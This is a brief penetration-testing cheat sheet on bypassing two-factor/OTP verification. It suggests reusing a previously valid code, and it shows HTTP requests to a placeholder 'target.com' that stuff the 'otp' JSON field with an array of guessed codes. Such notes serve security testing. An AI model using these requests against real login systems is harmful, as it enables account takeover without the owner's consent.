---
description: 2FA Bypass
---

# 2FA/OTP Bypass

### Test if the same code can be reused

Perform an action that requires a 2FA/OTP code and complete it normally. Then, perform the same action and try to reuse the old code, instead of the new one.

### Bypass verification sending a large number of codes

Imagine that an application expects an OTP as shown in the following request:

```http
POST /auth/otp HTTP/1.1
Host: target.com
Content-type: application/json
.
.

{
"otp":"1234"
}
```

In that case, we can try to send a large number of possible codes as an array:

```http
POST /auth/otp HTTP/1.1
Host: target.com
Content-type: application/json
.
.

{
"otp":[
"1234",
"1111",
"1337",
"2222",
"3333",
"4444",
"5555"
]
}
```
